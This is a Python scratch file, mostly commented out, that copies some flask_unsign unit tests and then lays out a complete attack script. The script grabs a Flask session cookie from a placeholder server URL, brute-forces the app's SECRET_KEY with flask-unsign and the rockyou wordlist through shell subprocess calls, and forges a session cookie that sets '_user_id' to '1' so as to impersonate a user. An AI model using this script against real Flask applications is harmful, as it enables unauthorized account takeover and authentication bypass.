import requests
import subprocess
import flask_unsign
from flask_unsign.helpers import wordlist

print("Test")
# kwargs = {
#             'value': self.value,
#             'secret': self.secret
#         }

# modern = flask_unsign.sign(**kwargs)

# self.assertTrue(flask_unsign.verify(modern, self.secret))
# self.assertTrue(flask_unsign.verify(legacy, self.secret, legacy=True))

# self.assertFalse(flask_unsign.verify(modern, self.secret + 'x'))
# self.assertFalse(flask_unsign.verify(legacy, self.secret + 'x', legacy=True))

# self.assertEqual(self.value, flask_unsign.decode(modern))
# self.assertEqual(self.value, flask_unsign.decode(legacy))

# with self.assertRaises(flask_unsign.DecodeError):
#     flask_unsign.decode('Hello world!')

# with self.assertRaises(flask_unsign.DecodeError):
#     flask_unsign.decode('')

# with wordlist(flask_unsign.DEFAULT_WORDLIST) as iterable:
#     cracker = flask_unsign.Cracker(value=modern)
#     cracker.crack(iterable)
#     self.assertEqual(cracker.secret, self.secret)

# with wordlist(flask_unsign.DEFAULT_WORDLIST) as iterable:
#     cracker = flask_unsign.Cracker(value=legacy, legacy=True)
#     cracker.crack(iterable)
#     self.assertEqual(cracker.secret, self.secret)

# def test_verify(self):
#     with self.assertRaises(FlaskUnsignException):
#         flask_unsign.verify(value='', secret=[], legacy=False)

# # URL of the Flask web server
# webserver_url = '<URL_OF_YOUR_WEBSERVER>'

# # Send a request to the Flask webserver and obtain the session cookie
# response = requests.get(webserver_url)
# if 'session' in response.cookies:
#     session_cookie = response.cookies['session']
#     print(f"Session cookie obtained: {session_cookie}")
# else:
#     raise ValueError("Session cookie not found in the response.")

# # Path to the rockyou password list
# rockyou_path = '/path/to/rockyou.txt'  # Replace with your actual path

# # Brute force the SECRET_KEY using flask-unsign and rockyou password list
# try:
#     brute_force_command = f"flask-unsign --unsign --cookie '{session_cookie}' --wordlist {rockyou_path}"
#     result = subprocess.run(brute_force_command, shell=True,
#                             text=True, capture_output=True)
#     secret_key = result.stdout.strip()
#     if secret_key:
#         print(f"Discovered SECRET_KEY: {secret_key}")
#     else:
#         raise ValueError("Failed to brute force the SECRET_KEY.")
# except Exception as e:
#     print(f"Error during brute forcing: {e}")

# # Craft a session cookie using the discovered SECRET_KEY
# cookie_data = "{'_fresh': True, '_id': 'ee9b5996575c831cd47cc8c008248771af996555a6c354b0d3550f4e581319cf31f3eeceee719de381cba941ebd5ac4a282516879c367df267179ca582785b90', '_user_id': '1'}"
# craft_cookie_command = f"flask-unsign --sign --cookie \"{cookie_data}\" --secret {secret_key}"
# try:
#     result = subprocess.run(craft_cookie_command,
#                             shell=True, text=True, capture_output=True)
#     crafted_cookie = result.stdout.strip()
#     if crafted_cookie:
#         print(f"Crafted session cookie: {crafted_cookie}")
#     else:
#         raise ValueError("Failed to craft the session cookie.")
# except Exception as e:
#     print(f"Error during cookie crafting: {e}")
